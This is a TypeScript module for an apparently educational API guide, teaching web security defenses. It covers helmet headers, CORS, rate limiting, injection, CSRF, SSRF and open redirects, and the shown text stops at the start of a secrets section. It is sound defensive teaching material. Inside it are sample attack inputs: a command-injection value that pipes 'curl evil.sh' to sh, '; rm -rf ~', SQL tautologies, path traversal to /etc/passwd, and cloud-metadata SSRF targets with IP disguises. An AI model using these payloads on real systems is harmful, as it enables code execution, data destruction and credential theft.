import type { Topic } from '../types.js';

/**
 * The Security topic: the defensive half of the guide. Everything here is
 * mounted for real somewhere in this app — helmet on every response
 * (app.ts), express-rate-limit and a hand-rolled fixed window on the demo
 * routes, a hand-rolled CORS factory with an allowlist, and the SSRF guard
 * — and the live lab drives all of it. Concept-first as always: threat
 * models before tactics, defaults before features.
 */
export const topicSecurity: Topic = {
  id: 'security',
  title: 'Security',
  subtitle:
    'helmet, CORS, rate limiting, injection, CSRF/XSS/SSRF, secrets, and the OWASP API Top 10.',
  group: 'auth-security',
  order: 3,
  sections: [
    {
      id: 'security-threat-model',
      title: 'The threat model habit',
      lead:
        'Before any tactic: WHAT are you protecting, FROM WHOM, and THROUGH which doors. Security work without a threat model is helmet-collection — buying tools and hoping they map to your risks.',
      blocks: [
        {
          kind: 'text',
          id: 'security-threat-model:habit',
          body: `THE HABIT, IN ONE LINE: assets → actors → attacks → defenses, in that order, on paper, before you write a line of defensive code. ASSETS are what loses you money, reputation, or users when exposed or destroyed — for an API, typically the data behind it (this guide's posts and demo documents), the credentials that reach it (session tokens, API keys, JWTs), the service's availability itself, and the users' trust (a leak of PII is an asset loss even when the data was "boring"). ACTORS are who might touch those assets wrongly — and the list must include the boring ones before the exciting ones: the anonymous internet (deploy anything public and bots arrive within the hour, probing /wp-admin and known CVE paths), the AUTHENTICATED legitimate user (the authorization topic's carol — most real-world breaches are logged-in users reaching objects that were never theirs), the insider with partial access, and the compromised dependency in your own node_modules. ATTACKS are the concrete moves each actor can make against each asset — injection, brute force, IDOR, SSRF, CSRF — each of which gets its own section below. DEFENSES come last, and only then does it make sense to say "so we mount helmet" or "so we rate-limit login". The failure mode this ordering prevents is TOOL-FIRST SECURITY: enabling every middleware in the README while the actual door (an unvalidated redirect, a string-built query) stands open behind them. TRUST BOUNDARIES are the second habit: draw the line where data crosses from UNTRUSTED to TRUSTED, and treat every crossing as an inspection point. In this app the outermost boundary is the HTTP edge — every query param, path segment, header, and body byte is attacker-controlled until validated (the validation topic's boundary rule, now with a security rationale) — but boundaries exist INSIDE too: the webhook receiver treats its own request body as untrusted until the HMAC verifies; the authz resolver treats cookie, key, and token as claims to verify, not facts; a microservice call is a boundary (was that really service B?). The question "where does untrusted data become trusted, and who checked it?" asked of any architecture is the fastest security review you can do. LEAST PRIVILEGE is the third: every identity — user, service, process, KEY — holds the minimum permissions for its job, because blast radius is what privilege buys down. This app's demo API keys are scope-limited on purpose (a read-only dashboard key exists next to an admin key), the RBAC table gives viewer strictly less than editor, and the deeper pattern to internalize is DEFAULT-DENY + EXPLICIT GRANTS (the authorization topic's whole shape). Security as DEFAULTS, not FEATURES — the last habit and the one that separates apps that stay secure from apps that get patched: a defense that must be REMEMBERED per-route (add the CORS check here, sanitize this query there) is a defense you will eventually forget; a defense that applies UNLESS OPTED OUT of (helmet on every response, parameterized queries as the only DAO style, one error envelope that never leaks stack traces, HttpOnly+SameSite cookies baked into the serializer) survives new routes, new authors, and Friday afternoons. Every mechanism in this topic was chosen to be a default in this repo — that is the meta-lesson.`,
        },
      ],
    },
    {
      id: 'security-headers',
      title: 'Secure headers — helmet, mounted for real',
      lead:
        'One middleware sets a dozen defenses before any route runs. Each header neutralizes a named attack class; helmet is the maintenance contract for all of them at once.',
      blocks: [
        {
          kind: 'text',
          id: 'security-headers:each-job',
          body: `THE HEADERS, EACH WITH ITS THREAT. CONTENT-SECURITY-POLICY is the strongest of the set — a whitelist of what the served page may load and execute (scripts, styles, images, connections), which turns most XSS payloads from "runs" into "blocked": even if an attacker injects a <script> tag, script-src 'self' means inline script never executes. It is a DOCUMENT policy, so it matters most on routes that serve HTML — this app's Swagger UI at /docs and the OAuth consent page — while pure JSON APIs mostly set it so no proxy or injection can ever wrap their responses in a page. STRICT-TRANSPORT-SECURITY (HSTS) tells the browser "only ever reach me over HTTPS, for max-age seconds" — closing the downgrade strip where a man-in-the-middle answers the first plain-http request before the redirect to HTTPS happens. X-CONTENT-TYPE-OPTIONS: nosniff stops the browser second-guessing your Content-Type — without it, a user-uploaded "text file" the server calls text/plain can be sniffed as script and executed in your origin. X-FRAME-OPTIONS (and CSP frame-ancestors) says whether other sites may iframe your pages — the clickjacking defense, where a hostile page overlays your real, authenticated UI with invisible buttons. REFERRER-POLICY controls how much of your URL leaks out with every outbound click (no-referrer says nothing — your URLs often carry tokens-in-query-params and session ids, which is exactly how they end up in third-party analytics). CROSS-ORIGIN-OPENER-POLICY and CROSS-ORIGIN-RESOURCE-POLICY harden cross-origin isolation and who may embed your resources — newer, subtler, set by default because they cost nothing. WHAT HELMET DOES: it is ~eleven of these as one mount — one dependency, maintained, tracking the evolving defaults — instead of eleven hand-rolled res.setHeader calls that drift. Its defaults are conservative and sensible (CSP with self-only scripts, nosniff, SAMEORIGIN, no-referrer, HSTS at 180 days), and everything is tunable per concern. WHAT THIS APP TUNES, AND THE INTEGRATION LESSON: nothing was LOOSENED — but that is a verified conclusion, not a guess, and the verification is the transferable skill. The risky header for an existing app is always CSP, because it can break pages that were quietly relying on inline scripts or cross-origin assets. So the audit: Swagger UI's scripts are same-origin FILES (./swagger-ui-bundle.js → allowed by script-src 'self'), its inline <style> blocks are covered by style-src 'unsafe-inline' which helmet's own defaults already carry, and the OAuth consent page relies on the same allowance — /docs stays green under the full policy, proven by the docs specs. This repo pins the policy EXPLICITLY in app.ts (below) so a helmet upgrade can never silently change the guide's security posture, and the standing rule going forward: a future page wanting inline <script> earns a NONCE, never 'unsafe-inline' on script-src. Two dev-reality footnotes: HSTS rides on plain http in development and browsers simply ignore it there — which is why it is safe to mount early and non-negotiable the moment real TLS terminates in front (the deployment topic); and upgrade-insecure-requests is a no-op on localhost (browsers treat it as trustworthy) but would force-https LAN-IP visits — know which dev URL you use.`,
        },
        {
          kind: 'code',
          id: 'security-headers:verbatim-mount',
          language: 'ts',
          source: 'server/src/app.ts',
          caption: 'Verbatim — the app-wide helmet mount (src/app.ts, after request-id, before routes)',
          code: `import helmet from 'helmet';

// SECURITY HEADERS, for real: helmet on every response, before any route
// can answer. The CSP below is written out EXPLICITLY (pinned, commented)
// rather than inherited from helmet's defaults — the audit that produced it
// is the realistic integration lesson of this topic:
// - Swagger UI at /docs SURVIVES this policy as-is: same-origin scripts
//   (script-src 'self') + inline <style> (style-src 'unsafe-inline').
// - HSTS on plain http in dev is ignored by browsers — safe to set early.
app.use(
  helmet({
    contentSecurityPolicy: {
      useDefaults: false,
      directives: {
        'default-src': ["'self'"],
        'base-uri': ["'self'"],
        'font-src': ["'self'", 'https:', 'data:'],
        'form-action': ["'self'"],
        'frame-ancestors': ["'self'"],
        'img-src': ["'self'", 'data:'],
        'object-src': ["'none'"],
        'script-src': ["'self'"], // same-origin scripts only — /docs assets qualify
        'script-src-attr': ["'none'"], // no inline event handlers, ever
        'style-src': ["'self'", 'https:', "'unsafe-inline'"],
        'upgrade-insecure-requests': [],
      },
    },
  }),
);

// Order in the chain matters: request-id FIRST (errors must carry a
// correlation id), then helmet, then body parsing, then routes. Headers
// set here ride EVERY response — GET /api/demo/security/headers echoes
// the full set back so the lab can render what the browser received.`,
        },
        {
          kind: 'text',
          id: 'security-headers:x-powered-by',
          body: `THE HEADER THAT ISN'T THERE: x-powered-by. Express advertises its presence there by default, and while framework-version disclosure is a WEAKNESS rather than a vulnerability (an attacker who knows your framework can skip three other probes — security through obscurity is not a defense, but why hand out the map), this app removed it the direct way (app.disable('x-powered-by') in app.ts) — helmet also strips it, so the belt-and-suspenders pairing is deliberate: the app states its own policy about what it reveals, and a library confirms it. WHAT HEADERS ARE NOT: they are not access control, not encryption, not authentication. nosniff does not validate your uploads; CSP does not fix your SQL injection; HSTS does not encrypt anything by itself — it instructs the browser to demand TLS. Read the whole set as the browser-facing CONVENTANTS of a contract: "when MY pages run in YOUR browser, here are the restrictions I consent to". That framing also explains why headers are the cheapest defense per line of code in this topic: one mount, every response, no per-route work — the defaults-not-features habit, embodied.`,
        },
      ],
    },
    {
      id: 'security-cors',
      title: 'CORS in practice',
      lead:
        'The rule belongs to the browser, not the server. Understand same-origin policy, simple requests vs preflights, and why credentials turn "*" into a vulnerability — then read the hand-rolled middleware this app mounts.',
      blocks: [
        {
          kind: 'text',
          id: 'security-cors:browser-rule',
          body: `CORS IS A BROWSER ENFORCEMENT, and every confusion about it dissolves once that lands: the SERVER never blocks a cross-origin request — it answers it, fully, every time — the BROWSER is what refuses to hand the response to the requesting page when the rules say no. The default rule is the SAME-ORIGIN POLICY: a page at http://localhost:5173 may read responses that came from http://localhost:5173 (same scheme+host+port — all three must match), and may SEND requests anywhere, but may only READ same-origin responses. CORS (Cross-Origin Resource Sharing) is the RELAXATION mechanism — the server opts in, per origin, by attaching Access-Control-* headers; the browser checks them against the requesting page's origin and only then exposes the response to page JavaScript. This is why curl and server-to-server calls are never "blocked by CORS" — no browser, no enforcement — and why the middleware you are about to read adds headers and never errors: a disallowed origin gets NO CORS headers, its request still RUNS server-side, and the calling page's browser is the one that shows the red console error. (Corollary: CORS is not an access control for your API's data. Anyone can curl it. It protects BROWSER USERS of YOUR origins from OTHER sites' pages — a browser-facing integrity feature, not server armor.) SIMPLE VS PREFLIGHT: a "simple" cross-origin request (GET/HEAD/POST with only CORS-safelisted headers like Content-Type: text/plain or form data) is sent directly, and the browser checks the headers AFTERWARD — the request executed either way, only the reading is gated. Anything richer — a custom header (Authorization, x-api-key), JSON content-type, PATCH/DELETE — triggers a PREFLIGHT: the browser first sends OPTIONS with Access-Control-Request-Method (and -Headers), waits for the server's Access-Control-Allow-* answer, and only sends the real request if the preflight cleared. Preflights are cacheable (Access-Control-Max-Age), which is why a well-behaved API answers them cheap and fast (204, no body) — your routes never even see them. THE CREDENTIALS TRAP: by default, cross-origin fetches carry NO cookies. With credentials: 'include' the browser sends them — but then the spec FORBIDS the wildcard: Access-Control-Allow-Origin: '*' cannot be combined with Access-Control-Allow-Credentials: true, because a wildcard-with-cookies would let ANY site's page act as the logged-in user against your API. The only safe pairing is EXACT-ORIGIN ECHO from an allowlist you control — reflect the one specific origin that matched, never the request's Origin header unsanitized (origin-reflection is the classic CORS misconfiguration: it makes every origin "allowed" and, with credentials on, is a full account-takeover primitive). THE MIDDLEWARE, hand-rolled on purpose (the cors npm package is excellent and maps 1:1 to these options — it is the catalog choice for production; the mechanism is what you are learning): an exact-match ALLOWLIST of origins, methods, and headers; Vary: Origin on every decision (a cache serving one origin's allowed response to another origin's request would be a leak); preflights answered 204 with Allow-Methods/Headers/Max-Age; and the disallowed path adding nothing at all. It is mounted on the security demo routes with allowlist ['http://localhost:5173','https://example.com'] — fire GET /api/demo/security/cors-check?origin=… for verdicts, or an OPTIONS preflight at /cors-probe and watch the difference an Origin header makes.`,
        },
        {
          kind: 'code',
          id: 'security-cors:verbatim-factory',
          language: 'ts',
          source: 'server/src/presentation/middleware/cors_middleware.ts',
          caption: 'Verbatim — the decision function + preflight handling (presentation/middleware/cors_middleware.ts)',
          code: `// The single decision the middleware AND the /cors-check endpoint share:
export function evaluateCorsOrigin(
  options: CorsOptions,
  origin: string,
): { allowed: boolean; allowOrigin: string | null; credentials: boolean } {
  const normalized = normalizeOrigin(origin);
  const match = options.origins.find((allowed) => normalizeOrigin(allowed) === normalized);
  return {
    allowed: match !== undefined,
    // Echo the ALLOWLISTED spelling, never the raw request value: with
    // credentials on, ACAO MUST be a single concrete origin — "*" and
    // origin-reflection are how credentialed CORS leaks.
    allowOrigin: match ?? null,
    credentials: options.credentials === true,
  };
}

// …and inside the middleware, after the allowlist verdict:
res.setHeader('Vary', 'Origin');              // caches must not cross-match origins
if (!verdict.allowed) {
  next();                                     // DENIED = no headers, request RUNS —
  return;                                     //   the BROWSER blocks the page, not us
}
res.setHeader('Access-Control-Allow-Origin', verdict.allowOrigin as string);
if (verdict.credentials) {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
}
const isPreflight =
  req.method === 'OPTIONS' && req.headers['access-control-request-method'] !== undefined;
if (isPreflight) {
  res.setHeader('Access-Control-Allow-Methods', methods.join(', '));
  res.setHeader('Access-Control-Allow-Headers', headers.join(', '));
  res.setHeader('Access-Control-Max-Age', String(maxAgeSeconds));
  res.status(204).end();                      // cheap, cacheable — no route ever sees it
  return;
}
next();`,
        },
        {
          kind: 'text',
          id: 'security-cors:not-auth',
          body: `WHAT CORS IS NOT, one more time, because it accounts for half the questions ever asked about it: it is NOT authentication (the request came in and was served — an attacker's SCRIPT simply cannot read the answer), NOT a firewall (rate-limit and authorize at the edge, not via header games), and NOT a reason to put secrets in a "CORS-protected" endpoint (any non-browser client reads it freely). It is ALSO not only about JavaScript: media, fonts, and fetches from documents all sit under the same-origin umbrella with their own resource-sharing rules. The engineering checklist when a teammate says "CORS error": (1) whose ORIGIN is the page actually on (scheme+host+PORT — a common miss: 5173 vs 5174 is cross-origin); (2) is the failing call a PREFLIGHT (custom header? non-simple method?) — the OPTIONS request in the network tab is the one to read; (3) what does the SERVER actually return for that OPTIONS (no ACAO on a preflight = denied, whatever the intent was); (4) if cookies are involved, is the client using credentials:'include' AND the server a CONCRETE origin (never '*') AND the cookie SameSite-compatible with the cross-site context. Nine times out of ten the answer is in (3) — and now you can read the middleware that produces it.`,
        },
      ],
    },
    {
      id: 'security-rate-limiting',
      title: 'Rate limiting — the fixed window, twice',
      lead:
        'A counter, a window, and a 429. The hand-rolled fixed window first (the topic walks its code), then express-rate-limit mounted for real on the same router — a limiter you can trip live from the lab.',
      blocks: [
        {
          kind: 'text',
          id: 'security-rate-limiting:algorithm',
          body: `WHAT LIMITING IS FOR: availability and abuse control. The attacks it prices out are brute-force logins (try 10,000 passwords → now 5 per minute), credential stuffing, scraping, review-spamming, and plain resource exhaustion (one client hammering an expensive endpoint until everyone else times out) — the abuse layer BETWEEN "valid request" and "load my CDN can absorb". THE FIXED-WINDOW ALGORITHM, whole thing: keep a Map of key → {count, resetAt}. A request arrives: if now ≥ resetAt, start a fresh window; increment count; if count exceeded max, answer 429 with Retry-After; else proceed. O(1) per request, one entry per client, trivially explainable — which is why it is the right FIRST limiter and the one this app implements by hand (middleware/handmade_rate_limiter.ts, mounted on GET /api/demo/security/handmade-ping at 3 per 30s) next to the production pick (express-rate-limit on GET /ping at 5 per 60s) so the lab can trip both and compare. THE HONEST WEAKNESS: the window SEAM — 3 requests at the end of one window plus 3 at the start of the next is a burst of 6 inside a few seconds, up to 2×max across a boundary; and a client that learns the window rhythm can pace just under it forever. The upgrades, when seams matter: SLIDING WINDOW (count over the trailing N seconds — a log of timestamps or two half-windows averaged) and TOKEN BUCKET (bursty-but-capped, the shape API gateways love). KEYING — who is one client? By IP is the default (no auth needed) but lies in both directions behind a proxy or NAT: Express's req.ip is the proxy unless trust proxy is configured to read X-Forwarded-For, and that header is FORGEABLE upstream — set trust proxy to the exact hop count/proxy you control, never blindly true. By USER or API KEY is fairer (shared-NAT users stop sharing a budget) and survives IP rotation; production systems key login attempts by username+IP BOTH (one budget per account, one per source, so neither a distributed attack on one account nor one source attacking many accounts gets a free lane). THE 429 CONTRACT: status 429, a Retry-After header in SECONDS (integer, string on the wire) so well-behaved clients back off instead of hammering, and the RateLimit-* standardization line (RateLimit-Limit / -Remaining / -Reset, plus RateLimit-Policy; the older X-RateLimit-* spellings linger everywhere) so clients can SHOW the budget. In this app the 429 body is the canonical error envelope — the limiter throws RateLimitException, the one error taxonomy renders it — so a rate-limited client sees the same shape as every other failure, with limiter/limit/retryAfterSeconds merged into the details. WHAT LIMITS DON'T STOP: a DISTRIBUTED attack (10,000 IPs doing 2 requests each never trips any per-IP window — that battle belongs to upstream DDoS scrubbing, anomaly scoring, and proof-of-work challenges); slow-client connection attacks (slowloris holds sockets, never sends requests — a server.timeout concern); and patient low-and-slow abuse inside budget (detect by pattern, not by count). AT SCALE the in-memory Map dies with the process: N replicas each hold their own windows, so a client's effective limit is N×max. The fix is the store — move the counter to Redis (INCR + EXPIRE is a complete fixed window in two commands), which express-rate-limit anticipates with a Store interface (rate-limit-redis implements it) — the same "state leaves the process the moment there are two processes" move the caching topic made.`,
        },
        {
          kind: 'code',
          id: 'security-rate-limiting:verbatim-handmade',
          language: 'ts',
          source: 'server/src/presentation/middleware/handmade_rate_limiter.ts',
          caption: "Verbatim — the fixed window's core (presentation/middleware/handmade_rate_limiter.ts)",
          code: `const key = normalizeClientIp(req.ip);        // '::ffff:127.0.0.1' → '127.0.0.1'
let entry = windows.get(key);
if (entry === undefined || now >= entry.resetAt) {
  // First hit, or the window rolled — a fresh window starts now.
  entry = { count: 0, resetAt: now + windowMs };
  windows.set(key, entry);
}

const remaining = Math.max(0, max - entry.count - 1);
const resetAtSeconds = Math.ceil(entry.resetAt / 1000);
const retryAfterSeconds = Math.max(0, Math.ceil((entry.resetAt - now) / 1000));
// Retry-After and x-ratelimit-* are set BEFORE any throw so they survive
// into the error envelope response (headers already on res persist).
res.setHeader('X-RateLimit-Limit', String(max));
res.setHeader('X-RateLimit-Remaining', String(remaining));
res.setHeader('X-RateLimit-Reset', String(resetAtSeconds));

if (entry.count >= max) {
  res.setHeader('Retry-After', String(retryAfterSeconds));   // integer seconds
  throw new RateLimitException(                               // → the ONE error taxonomy
    \`too many requests to \${name}: limit is \${String(max)} per \${String(Math.ceil(windowMs / 1000))}s window — retry after \${String(retryAfterSeconds)}s\`,
    {
      limiter: name,
      limit: max,
      windowSeconds: Math.ceil(windowMs / 1000),
      retryAfterSeconds,
      resetAt: new Date(entry.resetAt).toISOString(),
      keyedBy: 'client ip (normalized)',
    },
  );
}
entry.count += 1;
next();`,
        },
        {
          kind: 'code',
          id: 'security-rate-limiting:verbatim-library',
          language: 'ts',
          source: 'server/src/presentation/routes/security_demo_routes.ts',
          caption: 'Verbatim — the production pick mounted (routes/security_demo_routes.ts)',
          code: `export const SECURITY_PING_LIMIT = 5;
export const SECURITY_PING_WINDOW_MS = 60_000;

const securityPingLimiter = rateLimit({
  windowMs: SECURITY_PING_WINDOW_MS,
  limit: SECURITY_PING_LIMIT,  // trip-able by hand in the UI — the point of a demo
  standardHeaders: true, // RateLimit-Policy/Limit/Remaining/Reset (draft-6 style)
  legacyHeaders: false, // no library-emitted X-RateLimit-* — the handmade twin shows those
  // The custom handler routes the trip through the app's ONE error taxonomy
  // (RateLimitException → rate_limited failure → canonical envelope) instead
  // of the library's default text body.
  handler: (req, _res, next) => {
    const info = rateLimitInfo(req);
    const retryAfterSeconds =
      info?.resetTime instanceof Date
        ? Math.max(0, Math.ceil((info.resetTime.getTime() - Date.now()) / 1000))
        : Math.ceil(SECURITY_PING_WINDOW_MS / 1000);
    next(
      new RateLimitException(
        \`too many requests: the /ping demo allows \${String(SECURITY_PING_LIMIT)} per \${String(Math.ceil(SECURITY_PING_WINDOW_MS / 1000))}s per client ip — retry after \${String(retryAfterSeconds)}s\`,
        {
          limiter: 'express-rate-limit (GET /api/demo/security/ping)',
          limit: SECURITY_PING_LIMIT,
          windowSeconds: Math.ceil(SECURITY_PING_WINDOW_MS / 1000),
          retryAfterSeconds,
          keyedBy: 'client ip',
        },
      ),
    );
  },
});

// A DEDICATED limiter on ONE route — never a global app.use() limit, which
// would throttle the whole guide (and every test) after five requests:
securityDemoRouter.get('/demo/security/ping', securityPingLimiter, pingController);`,
        },
      ],
    },
    {
      id: 'security-injection',
      title: 'Injection — the whole family',
      lead:
        'One rule covers every member: DATA must never become CODE. SQL, commands, HTML, paths, templates, URLs — the payload changes, the vulnerability is always the same shape.',
      blocks: [
        {
          kind: 'text',
          id: 'security-injection:one-rule',
          body: `THE SHAPE, ONCE: input crosses a trust boundary into a place where two languages share one string — SQL and its data, a shell and its arguments, HTML and its text, a filesystem path and its filename — and a delimiter in the DATA rewrites the CODE. ' OR '1'='1 closes your quote and adds a tautology; "; rm -rf ~ closes your filename and adds a command; </textarea><script> closes your textarea and adds an element; ../../ escapes your directory. THE ONE DEFENSE with two equivalent spellings: (1) SEPARATE THE LANGUAGES — parameterized statements, argv arrays, text nodes: the data channel and the code channel never share a string; (2) VALIDATE AT THE BOUNDARY so the input never carries delimiters at all (allowlists of shape, not blocklists of "known-bad characters" — blocklists always miss one encoding). Spelling 1 is strictly stronger and is the default this repo enforces; spelling 2 is the boundary discipline the validation topic built. THE FAMILY TOUR, mapped to this app. SQL: every statement in PostDao binds ? or @named parameters — string-built SQL does not exist in the tree — and the SQL-with-Node topic proves it live (/api/demo/db/injection binds the attack string as a PARAMETER and shows it landing as inert text). COMMAND INJECTION: the shell is a whole programming language your input must never enter — exec(\`convert \${file}\`) executes metacharacters (; | && $(…)) as CODE; execFile('convert', [file]) passes an argv array with NO shell in the middle. This app currently shells out nowhere (an honest status the demo endpoint reports); the day it does, execFile is the style, and the filename is validated first. XSS — the injection that lands in the BROWSER: React escapes text nodes BY DEFAULT — a post body full of <script> renders as visible text, which is why this guide's code blocks are safe by construction (the client renders code as children, never innerHTML/dangerouslySetInnerHTML — that prop is the opt-OUT of escaping and should appear in your codebase approximately never, and only for HTML you generated or sanitized yourself). The deeper XSS truths: the dangerous sink moves when you use a framework (href={userInput} is javascript:-URL injection; style objects can smuggle exfiltration via CSS), CSP is the second line of defense that limits what any slipped-through script can DO, and STORED XSS (payload saved by one user, served to another — an admin) is the privileged variant that makes any rich-text input a security review. PATH TRAVERSAL: path.join(root, '../../etc/passwd') happily walks out — join concatenates, it does not contain; the guard is resolve() then assert the result STILL STARTS WITH the resolved root (plus serving files by server-generated ids, never by client paths — the Files & Media topic will demo this for real). TEMPLATE INJECTION: the rare-but-fatal member — compiling USER TEXT as a template (ejs.render(userDraft), or user input inside a template string that itself gets evaluated) hands the attacker the template language's escape hatch (in EJS it is <%= … %>, and from there often straight to require). User input is DATA for a template, never the template's SOURCE. The catalog endpoint serves every pair as data — GET /api/demo/security/injection-samples returns the five families' unsafe/safe code plus this repo's own enforced-status list, including what is honestly still only PLANNED (path containment waits for Files & Media).`,
        },
        {
          kind: 'code',
          id: 'security-injection:pairs',
          language: 'ts',
          source: 'server/src/presentation/routes/security_demo_routes.ts',
          caption: 'Two of the five pairs served by GET /api/demo/security/injection-samples (sql + command)',
          code: `// sql — ❌ user input concatenated into the query TEXT:
const query = \\\`SELECT * FROM posts WHERE author = '\\\${author}'\\\`;
//      author = "x' OR '1'='1"  →  every row falls out
// sql — ✅ the app's own PostDao (data/posts/post_dao.ts) — bound parameters:
db.prepare('SELECT … FROM posts WHERE id = ?').get(id);
// db.prepare('INSERT INTO posts (…) VALUES (@id, @title, …)').run(row);

// command — ❌ a shell interprets metacharacters:
exec(\\\`convert \\\${String(userFile)} out.png\\\`);
//      userFile = "a.png; curl evil.sh | sh"
// command — ✅ execFile — argv array, no shell, and validate the filename first:
// execFile('convert', [validatedFile, 'out.png'], callback);`,
        },
      ],
    },
    {
      id: 'security-csrf-ssrf',
      title: 'CSRF, SSRF, and friends',
      lead:
        'Three request-forgery classes: the browser tricked into sending YOUR cookies (CSRF), the server tricked into fetching WHERE IT SHOULD NOT (SSRF), and the redirect tricked into going anywhere (open redirects).',
      blocks: [
        {
          kind: 'text',
          id: 'security-csrf-ssrf:csrf',
          body: `CSRF — CROSS-SITE REQUEST FORGERY — the anatomy: browsers AUTOMATICALLY attach your cookies to requests to a site, regardless of WHICH page the request came from. So a hostile page (or email image, or ad iframe) fires POST https://yourbank.com/transfer with the victim's session cookie along for the ride — the server sees a fully authenticated request from the real user, executing the attacker's intent. The missing piece in that sentence is a second proof of INTENT. THE DEFENSES, layered: (1) SAMESITE COOKIES — Lax (this app's session cookie, via cookie_utils.ts) withholds the cookie on cross-site POSTs while allowing top-level navigations; Strict allows nothing cross-site; this has quietly become the primary defense since browsers flipped the default, but old browsers and SameSite=None corners mean it is a layer, not the whole answer. (2) CSRF TOKENS — the page embeds a server-issued secret the hostile page CANNOT read (same-origin policy protects it) and the form/ajax echoes it back; the forged request doesn't know it. Synchronizer tokens (server stores) or double-submit (cookie+header must match) are the shapes. (3) ORIGIN/SEC-FETCH-SITE CHECKS — reject state-changing requests whose Origin (or the newer Sec-Fetch-Site: cross-site) doesn't match; crude, effective, and exactly what the strictness of the fetch metadata standards is for. THE JSON-API MITIGATION, honestly stated — why this guide's API has a small CSRF surface WITHOUT a token system: browsers cannot make a cross-origin request with Content-Type: application/json or a custom Authorization/x-api-key header WITHOUT passing a CORS preflight the hostile page fails, and HTML forms cannot speak JSON at all — so every Bearer-token or API-key demo route is structurally CSRF-resistant (no ambient authority to hijack). The SESSION-COOKIE routes are the honest remainder: they mutate demo state (login/logout), are SameSite=Lax-protected, and would warrant tokens the day they did anything real. The general rule the trade teaches: COOKIE-AUTHENTICATED, BROWSER-REACHABLE, STATE-CHANGING → needs CSRF defense; none of those three → the attack shape doesn't apply, and SAYING WHY is the security review.`,
        },
        {
          kind: 'text',
          id: 'security-csrf-ssrf:ssrf',
          body: `SSRF — SERVER-SIDE REQUEST FORGERY — the anatomy: your server can reach things the outside world cannot (cloud metadata endpoints that hand out credentials, internal admin panels, databases without public IPs, localhost services) — and any feature where the SERVER fetches a URL the CLIENT chose ("import from URL", "preview this link", webhooks-out, PDF-from-HTML) is a request the attacker is steering from inside your network position. The REAL INCIDENT SHAPES, because they are all variations on four moves: fetch http://169.254.169.254/latest/meta-data/ (AWS/GCP/Azure metadata — historically returned instance credentials with no auth; IMDSv2 and requiring tokens closed the worst of it, the defense-in-depth on the PROVIDER side) and now the attacker holds your cloud keys; fetch an INTERNAL admin endpoint (http://10.0.0.5:8080/admin) the firewall correctly hid from the internet; PORT-SCAN your internal network by timing errors (a cheap internal map for the next attack); and follow a REDIRECT from an allowed host to a forbidden one (the allowlist checked the first hop, not the second). THE DEFENSE, in one word: ALLOWLIST — the list of hosts the feature may ever contact, exact-match, decided by YOU in config, checked BEFORE any socket opens; deny private/loopback/link-local ranges by default (RFC 1918, 127/8, 169.254/16, ::1, fc00::/7); scheme must be http(s); redirects followed only through the same guard (or not at all). THE EVASIONS a string-level guard must still catch — and this is where naive checks die: 0x7f000001 and 2130706433 and 0177.0.0.1 and 127.1 are all 127.0.0.1 in disguise (modern URL parsers canonicalize them, which HELPS you — if you actually parse), http://allowlisted.com@169.254.169.254/ puts the allowlisted name in the USERINFO where it means nothing (URL.hostname is the part after the last @), [::ffff:127.0.0.1] is loopback wearing an IPv6 dress, and xn-- punycode hides homograph look-alikes of real hosts. This app's guard (below, live at GET /api/demo/security/ssrf-guard) checks BOTH the parsed hostname AND the raw spelling — a disguise is denied as an evasion even when it canonicalizes to an allowlisted address — and its HONEST LIMIT is stated in its own output: it inspects STRINGS. A name that resolves where you didn't expect (DNS rebinding — the record changes between your check and your fetch) defeats every string check; a production guard resolves DNS, re-validates the resolved IP, and pins the connection to it, ideally with redirects disabled.`,
        },
        {
          kind: 'code',
          id: 'security-csrf-ssrf:verbatim-guard',
          language: 'ts',
          source: 'server/src/presentation/routes/security_demo_routes.ts',
          caption: "Verbatim — the SSRF guard's verdict chain (routes/security_demo_routes.ts)",
          code: `// Two spellings are checked on purpose:
// 1. the PARSED host — the truth about where the request would go;
// 2. the RAW spelling — URL parsing CANONICALIZES 0x7f000001 → 127.0.0.1,
//    so the disguise is only visible in what the user actually sent.
const host = parsed.hostname.toLowerCase().replace(/^\\[/, '').replace(/\\]$/, '');
const rawHost = extractRawHost(raw);

// The one allow: exact allowlist match, in the CANONICAL spelling.
if (SSRF_ALLOWLIST.includes(host) && rawHost === host) {
  return { allowed: true, host, kind: 'allowed', reason: 'host is on the exact-match allowlist (canonical spelling)' };
}
// …then punycode, hex/decimal/octal/shorthand IP disguises, IPv6 literals
// (incl. v4-mapped), and private ranges each get a NAMED verdict —
// 169.254.169.254 answers:
//   { allowed: false, kind: 'private_or_loopback_ip',
//     reason: 'link-local (169.254/16) — 169.254.169.254 is the cloud
//              instance-metadata address (the classic SSRF target)' }
// and the userinfo trick http://httpbin.org@169.254.169.254/ lands here with
// host = '169.254.169.254' — URL.hostname already unmasked it.`,
        },
        {
          kind: 'text',
          id: 'security-csrf-ssrf:open-redirects',
          body: `OPEN REDIRECTS — the small bug that punches above its weight: a redirect whose TARGET comes from the query (?next=, ?url=, ?returnTo=) without validation lets anyone craft https://your-trusted-domain/login?next=https://phishing-lookalike.com — your domain's reputation launders the link (filters, link-preview trust, human eyes), and in OAuth-adjacent flows a redirect that swallows a code or token is an account-takeoff, not a phishing nicety. THE FIX is the SSRF fix in miniature: an ALLOWLIST of permitted redirect targets, exact-or-scheme+host match, checked BEFORE the 302 — and the in-repo example is the OAuth demo's authorize endpoint (oauth_demo_routes.ts), which rejects any redirect_uri not on the client's registered allowlist with a 400 BEFORE any code is minted; the code it issues is also SINGLE-USE and bound to that exact uri (oauth_store.ts), so a stolen or reflected code dies on redemption. THE GENERAL FAMILY these three share — CSRF, SSRF, open redirect — is REQUEST FORGERY: making a trusting component (browser, server, redirect, webhook consumer) send something somewhere it shouldn't. The shared defense grammar: prove WHERE the instruction came from (Origin, Sec-Fetch-Site, HMAC over raw bytes — the webhooks topic's receiver), constrain WHERE it may go (allowlists for redirects and fetches), and make the instruction UNFORGEABLE where you can (tokens, nonces, single-use codes). When you review a feature, ask "can I make this component talk to something it didn't choose to?" — that question finds all three.`,
        },
      ],
    },
    {
      id: 'security-secrets',
      title: 'Secrets and config',
      lead:
        'A leaked secret is forever: git history never forgets, logs get shipped everywhere, and rotation is the only remediation. 12-factor config, redaction, and rotation discipline.',
      blocks: [
        {
          kind: 'text',
          id: 'security-secrets:rules',
